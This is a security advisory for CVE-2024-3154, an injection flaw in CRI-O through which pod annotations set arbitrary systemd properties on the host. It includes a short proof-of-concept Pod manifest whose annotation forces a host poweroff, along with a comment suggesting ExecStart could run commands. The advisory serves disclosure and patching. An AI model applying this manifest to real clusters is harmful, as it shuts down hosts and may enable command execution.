# CRI-O vulnerable to an arbitrary systemd property injection

**GHSA**: GHSA-2cgq-h8xw-2v5j | **CVE**: CVE-2024-3154 | **Severity**: high (CVSS 7.2)

**CWE**: CWE-77

**Affected Packages**:
- **github.com/cri-o/cri-o** (go): >= 1.29.0, <= 1.29.3
- **github.com/cri-o/cri-o** (go): >= 1.28.0, <= 1.28.5
- **github.com/cri-o/cri-o** (go): <= 1.27.5

## Description

### Impact
On CRI-O, it looks like an arbitrary systemd property can be injected via a Pod annotation:
```
---
apiVersion: v1
kind: Pod
metadata:
  name: poc-arbitrary-systemd-property-injection
  annotations:
    # I believe that ExecStart with an arbitrary command works here too,
    # but I haven't figured out how to marshalize the ExecStart struct to gvariant string.
    org.systemd.property.SuccessAction: "'poweroff-force'"
spec:
  containers:
    - name: hello
      image: [quay.io/podman/hello](http://quay.io/podman/hello)
```

This means that any user who can create a pod with an arbitrary annotation may perform an arbitrary action on the host system.

Tested with CRI-O v1.24 on minikube.
I didn't test the latest v1.29 because it is incompatible with minikube: https://github.com/kubernetes/minikube/pull/18367

Thanks to Cédric Clerget (GitHub ID @cclerget) for finding out that CRI-O just passes pod annotations to OCI annotations:
https://github.com/opencontainers/runc/pull/3923#discussion_r1532292536

CRI-O has to filter out annotations that have the prefix "org.systemd.property."

See also:
- https://github.com/opencontainers/runtime-spec/blob/main/features.md#unsafe-annotations-in-configjson
- https://github.com/opencontainers/runc/pull/4217


### Workarounds
Unfortunately, the only workarounds would involve an external mutating webhook to disallow these annotations

### References


